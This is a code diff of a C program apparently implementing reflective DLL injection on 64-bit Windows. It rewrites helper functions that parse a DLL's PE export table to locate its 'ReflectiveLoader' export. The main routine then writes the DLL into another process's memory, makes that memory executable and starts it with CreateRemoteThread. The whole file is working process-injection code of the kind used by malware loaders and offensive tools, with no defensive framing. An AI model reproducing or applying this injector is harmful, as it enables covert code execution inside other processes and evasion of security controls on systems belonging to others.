@@ -2,135 +2,50 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define DEREF(name) *(UINT_PTR *)(name)
-#define DEREF_64(name) *(DWORD64 *)(name)
-#define DEREF_32(name) *(DWORD *)(name)
-#define DEREF_16(name) *(WORD *)(name)
-#define DEREF_8(name) *(BYTE *)(name)
-
-DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress, BOOL is64)
+DWORD64 rva_to_offset(DWORD64 rva, DWORD64 base_address)
 {
-    WORD wIndex = 0;
-    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
-    PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
-    PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;
+    PIMAGE_NT_HEADERS64 nt_headers_address = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);
 
-    if (is64)
+    DWORD64 section_virtual_address;
+    DWORD64 section_data_address;
+
+    PIMAGE_SECTION_HEADER section_header_address = IMAGE_FIRST_SECTION(nt_headers_address);
+    if (rva < section_header_address->PointerToRawData) // if pointer to pe header
+        return rva;
+
+    for (; section_header_address->VirtualAddress != (DWORD64)NULL; section_header_address++)
     {
-        pNtHeaders64 = (PIMAGE_NT_HEADERS64)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
-
-        pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);
-
-        if (dwRva < pSectionHeader[0].PointerToRawData)
-            return dwRva;
-
-        for (wIndex = 0; wIndex < pNtHeaders64->FileHeader.NumberOfSections; wIndex++)
-        {
-            if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
-                return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
-        }
+        // rva = virtual_address + virtual_address_offset
+        // rva + raw_address = virtual_address + virtual_address_offset + raw_address
+        // rva - virtual_address + raw_address = raw_address + virtual_address_offset
+        if (rva >= section_header_address->VirtualAddress && rva < (section_header_address->VirtualAddress + section_header_address->SizeOfRawData))
+            return rva - section_header_address->VirtualAddress + section_header_address->PointerToRawData;
     }
-    else
-    {
-        pNtHeaders32 = (PIMAGE_NT_HEADERS32)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
-
-        pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
-
-        if (dwRva < pSectionHeader[0].PointerToRawData)
-            return dwRva;
-
-        for (wIndex = 0; wIndex < pNtHeaders32->FileHeader.NumberOfSections; wIndex++)
-        {
-            if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
-                return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
-        }
-    }
-
     return 0;
 }
 
-DWORD GetReflectiveLoaderOffset(VOID *lpReflectiveDllBuffer, LPCSTR cpReflectiveLoaderName)
+DWORD64 get_reflective_loader_offset(DWORD64 base_address, LPCSTR ReflectiveLoader_name)
 {
-    UINT_PTR uiBaseAddress = 0;
-    UINT_PTR uiExportDir = 0;
-    UINT_PTR uiNameArray = 0;
-    UINT_PTR uiAddressArray = 0;
-    UINT_PTR uiNameOrdinals = 0;
-    DWORD dwCounter = 0;
-    BOOL is64 = 0;
+    DWORD64 function_rva;
+    PIMAGE_NT_HEADERS64 nt_headers_address = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);
 
-    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
+    IMAGE_DATA_DIRECTORY exports_data_directory = nt_headers_address->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-    // get the File Offset of the modules NT Header
-    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)(base_address + rva_to_offset(exports_data_directory.VirtualAddress, base_address));
 
-    // process a PE file based on its architecture
-    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
+    DWORD* export_function_rva_address = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfFunctions, base_address));
+    DWORD* export_function_name_rva_address = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfNames, base_address));
+    WORD* export_function_ordinal_rva_address = (WORD*)(base_address + rva_to_offset(export_directory->AddressOfNameOrdinals, base_address));
+
+    for(int n = 0; n < export_directory->NumberOfNames; n++)
     {
-        is64 = FALSE;
-        // uiNameArray = the address of the modules export directory entry
-        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    }
-    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
-    {
-        is64 = TRUE;
-        // uiNameArray = the address of the modules export directory entry
-        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    }
-    else
-    {
-        return 0;
-    }
+        char *export_function_name = (char *)(base_address + rva_to_offset(export_function_name_rva_address[n], base_address));
 
-    // get the File Offset of the export directory
-    uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress, is64);
-
-    // get the File Offset for the array of name pointers
-    uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress, is64);
-
-    // get the File Offset for the array of addresses
-    uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress, is64);
-
-    // get the File Offset for the array of name ordinals
-    uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress, is64);
-
-    // test if we are importing by name or by ordinal...
-    if ((((DWORD_PTR)cpReflectiveLoaderName) >> 16) == 0)
-    {
-        // import by ordinal...
-
-        // use the import ordinal (- export ordinal base) as an index into the array of addresses
-        uiAddressArray += ((IMAGE_ORDINAL((DWORD)(DWORD_PTR)cpReflectiveLoaderName) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
-
-        // resolve the address for this imported function
-        return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress, is64);
-    }
-
-    // import by name...
-    // get a counter for the number of exported functions...
-    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
-
-    // loop through all the exported functions to find the ReflectiveLoader
-    while (dwCounter--)
-    {
-        char *cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress, is64));
-
-        if (strstr(cpExportedFunctionName, cpReflectiveLoaderName) != NULL)
+        if (!strcmp(export_function_name, ReflectiveLoader_name))
         {
-            // get the File Offset for the array of addresses
-            uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress, is64);
-
-            // use the functions name ordinal as an index into the array of name pointers
-            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
-
-            // return the File Offset to the ReflectiveLoader() functions code...
-            return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress, is64);
+            function_rva = export_function_rva_address[export_function_ordinal_rva_address[n]];
+            return rva_to_offset(function_rva, base_address);
         }
-        // get the next exported function name
-        uiNameArray += sizeof(DWORD);
-
-        // get the next exported function name ordinal
-        uiNameOrdinals += sizeof(WORD);
     }
 
     return 0;
@@ -149,35 +64,30 @@ int main(int argc, char *argv[])
     WaitForSingleObject(pi.hProcess, 1 * 1000);
 
     // //
+    DWORD dwOldProt;
 
-    // get dll into memory
+    // get dll into virtual memory
+    HANDLE file_handle = CreateFileA("dll_reflective_loader_64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD64 file_size = GetFileSize(file_handle, NULL);
+    LPVOID file_buf = HeapAlloc(GetProcessHeap(), 0, file_size);
+    ReadFile(file_handle, file_buf, file_size, NULL, NULL);
 
-    // HANDLE hFile = CreateFileA("reflective_dll.x64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    HANDLE hFile = CreateFileA("dll_reflective_loader.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD64 dwLength = GetFileSize(hFile, NULL);
-    LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
-    ReadFile(hFile, lpBuffer, dwLength, NULL, NULL);
+    DWORD64 reflective_loader_offset = get_reflective_loader_offset((DWORD64)file_buf, "ReflectiveLoader");
 
-    // TODO: process token stuff poc
+    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pi.dwProcessId);
 
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pi.dwProcessId);
+    LPVOID remote_file_buf_address = VirtualAllocEx(process_handle, NULL, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    printf("address %p\n", remote_file_buf_address + reflective_loader_offset);
 
-    // write dll into target process, call loader function remotely
+    WriteProcessMemory(process_handle, remote_file_buf_address, file_buf, file_size, NULL);
+    VirtualProtectEx(process_handle, remote_file_buf_address, file_size, PAGE_EXECUTE_READ, &dwOldProt);
 
-    DWORD64 dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, "ReflectiveLoader");
+    DWORD64 reflective_loader_address = (DWORD64)remote_file_buf_address + reflective_loader_offset;
 
-    printf("offset : %llx\n", dwReflectiveLoaderOffset);
-	DWORD dwOldProt; // this shit is mandatory !!!
+    HANDLE thread_handle = CreateRemoteThread(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)reflective_loader_address, 0, 0, 0);
+    WaitForSingleObject(thread_handle, -1);
 
-    LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    printf("address %p\n", lpRemoteLibraryBuffer);
-    WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL);
-    VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, &dwOldProt);
-
-    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, (DWORD_PTR)NULL, NULL);
-	WaitForSingleObject( hThread, -1 );
+    TerminateProcess(pi.hProcess, 0);
 
     printf("done.");
 
